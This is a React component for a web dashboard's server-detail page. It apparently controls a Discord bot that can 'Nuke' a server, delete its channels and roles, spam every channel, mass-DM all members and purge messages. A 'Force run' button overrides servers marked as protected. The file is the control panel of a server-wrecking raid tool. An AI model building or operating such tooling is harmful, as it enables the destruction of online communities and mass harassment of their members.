import { useCallback, useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { ArrowLeft, Shield, ShieldOff, Play, Loader2, Users, Hash, Crown, LogOut, RefreshCw } from 'lucide-react';
import { api } from '../../lib/api';
import { Card, Loader, Empty, Badge } from '../../components/ui';
import { nf, timeAgo } from '../../lib/format';

const ACTIONS = [
  { id: 'nuke', label: 'Nuke', danger: true },
  { id: 'set_name', label: 'Rename server' },
  { id: 'create_channels', label: 'Create channels' },
  { id: 'delete_channels', label: 'Delete channels', danger: true },
  { id: 'create_roles', label: 'Create roles' },
  { id: 'delete_roles', label: 'Delete roles', danger: true },
  { id: 'spam', label: 'Spam channel' },
  { id: 'spam_all', label: 'Spam all channels' },
  { id: 'dm_all', label: 'DM all members' },
  { id: 'lockdown', label: 'Lockdown' },
  { id: 'unlock', label: 'Unlock' },
  { id: 'nick_all', label: 'Nickname all' },
  { id: 'purge_all', label: 'Purge all' },
  { id: 'sync_commands', label: 'Sync commands' },
];

export default function ServerDetail() {
  const { guildId } = useParams();
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [busy, setBusy] = useState('');
  const [msg, setMsg] = useState(null);
  const [job, setJob] = useState(null);

  const load = useCallback(() => {
    setLoading(true);
    api.get(`/api/guilds/${guildId}`)
      .then((d) => setData(d?.data || null))
      .catch(() => setData(null))
      .finally(() => setLoading(false));
  }, [guildId]);

  useEffect(() => { load(); }, [load]);

  // job polling
  useEffect(() => {
    if (!job) return;
    let alive = true;
    const tick = async () => {
      try {
        const r = await api.get(`/api/guilds/${guildId}/actions`);
        const row = (r?.data || []).find((a) => a.jobId === job);
        if (alive && row && row.status !== 'queued') {
          setMsg({ ok: row.status === 'done', text: `${row.action}: ${row.status}` });
          setJob(null);
          setBusy('');
        }
      } catch { /* keep polling */ }
    };
    const id = setInterval(tick, 4000);
    return () => { alive = false; clearInterval(id); };
  }, [job, guildId]);

  const run = async (action, force = false) => {
    setBusy(action);
    setMsg(null);
    try {
      const r = await api.post(`/api/guilds/${guildId}/execute`, { action, force });
      setJob(r.jobId);
      setMsg({ ok: true, text: `${action} queued${r.forced ? ' (forced)' : ''}` });
    } catch (e) {
      if (e.status === 409) {
        setMsg({ ok: false, text: 'Server is protected. Press again with force.', force: action });
      } else {
        setMsg({ ok: false, text: e.message });
      }
      setBusy('');
    }
  };

  const toggleWhitelist = async () => {
    setBusy('whitelist');
    try {
      if (data?.protected) await api.delete(`/api/guilds/${guildId}/whitelist`);
      else await api.post(`/api/guilds/${guildId}/whitelist`);
      load();
    } catch (e) { setMsg({ ok: false, text: e.message }); } finally { setBusy(''); }
  };

  if (loading) return <Loader />;
  if (!data) return <Empty title="Server not found" sub="The bot may have left." action={<Link to="/dashboard/servers" className="btn-primary">Back</Link>} />;

  const live = data.live || {};

  return (
    <div className="space-y-6">
      <Link to="/dashboard/servers" className="inline-flex items-center gap-2 text-sm text-muted hover:text-white">
        <ArrowLeft size={14} /> All servers
      </Link>

      <div className="flex flex-wrap items-start justify-between gap-4">
        <div className="flex items-center gap-4">
          {data.icon && <img src={data.icon} alt="" className="h-14 w-14 rounded-2xl object-cover" />}
          <div>
            <h1 className="font-display text-2xl font-bold">{data.name || 'Unknown'}</h1>
            <p className="mono text-xs text-dim">{guildId}</p>
            <div className="mt-2 flex flex-wrap gap-2">
              {data.protected && <Badge tone="green">PROTECTED</Badge>}
              {live.boostLevel > 0 && <Badge tone="amber">BOOST {live.boostLevel}</Badge>}
              <Badge>{nf(live.memberCount ?? data.memberCount)} members</Badge>
            </div>
          </div>
        </div>
        <div className="flex gap-2">
          <button onClick={load} className="btn-ghost"><RefreshCw size={14} /></button>
          <button onClick={toggleWhitelist} disabled={!!busy} className="btn-ghost">
            {data.protected ? <ShieldOff size={14} /> : <Shield size={14} />}
            {data.protected ? 'Unprotect' : 'Protect'}
          </button>
        </div>
      </div>

      {msg && (
        <div className={'flex flex-wrap items-center gap-3 rounded-xl border p-3 text-sm ' +
          (msg.ok ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-200' : 'border-red-500/30 bg-red-500/10 text-red-200')}>
          {msg.force && <Play size={14} />}
          <span className="flex-1">{msg.text}</span>
          {msg.force && (
            <button onClick={() => run(msg.force, true)} className="btn-primary py-1.5 text-xs">Force run</button>
          )}
        </div>
      )}

      <div className="grid gap-4 sm:grid-cols-3">
        <Card className="text-center">
          <Users size={17} className="mx-auto text-muted" />
          <p className="mono mt-2 text-2xl font-bold">{nf(live.memberCount ?? data.memberCount)}</p>
          <p className="text-xs text-muted">Members</p>
        </Card>
        <Card className="text-center">
          <Hash size={17} className="mx-auto text-muted" />
          <p className="mono mt-2 text-2xl font-bold">{nf(live.channelCount ?? data.channelCount)}</p>
          <p className="text-xs text-muted">Channels</p>
        </Card>
        <Card className="text-center">
          <Crown size={17} className="mx-auto text-muted" />
          <p className="mono mt-2 text-2xl font-bold">{nf(live.roleCount ?? data.roleCount)}</p>
          <p className="text-xs text-muted">Roles</p>
        </Card>
      </div>

      <Card>
        <h2 className="font-display font-semibold">Actions</h2>
        <p className="mt-1 text-xs text-muted">Runs on the bot. Large servers can take a minute.</p>
        <div className="mt-4 flex flex-wrap gap-2">
          {ACTIONS.map((a) => (
            <button
              key={a.id}
              onClick={() => run(a.id)}
              disabled={!!busy}
              className={(a.danger ? 'btn-danger' : 'btn-ghost') + ' text-xs'}
            >
              {busy === a.id ? <Loader2 size={13} className="animate-spin" /> : <Play size={13} />}
              {a.label}
            </button>
          ))}
          <button onClick={() => api.post(`/api/guilds/${guildId}/leave`).catch(() => {})} className="btn-ghost text-xs">
            <LogOut size={13} /> Leave
          </button>
        </div>
      </Card>

      <Card>
        <h2 className="font-display font-semibold">Recent actions</h2>
        <div className="mt-4 divide-y divide-edge">
          {(data.actions || []).length === 0 && <p className="py-3 text-sm text-muted">No actions yet.</p>}
          {(data.actions || []).map((a) => (
            <div key={a.id} className="flex items-center gap-3 py-3 text-sm">
              <code className="mono text-xs">{a.action}</code>
              <span className="text-[11px] text-dim">{timeAgo(a.createdAt)}</span>
              <Badge
                className="ml-auto"
                tone={a.status === 'done' ? 'green' : a.status === 'failed' ? 'red' : 'amber'}
              >
                {a.status}
              </Badge>
            </div>
          ))}
        </div>
      </Card>
    </div>
  );
}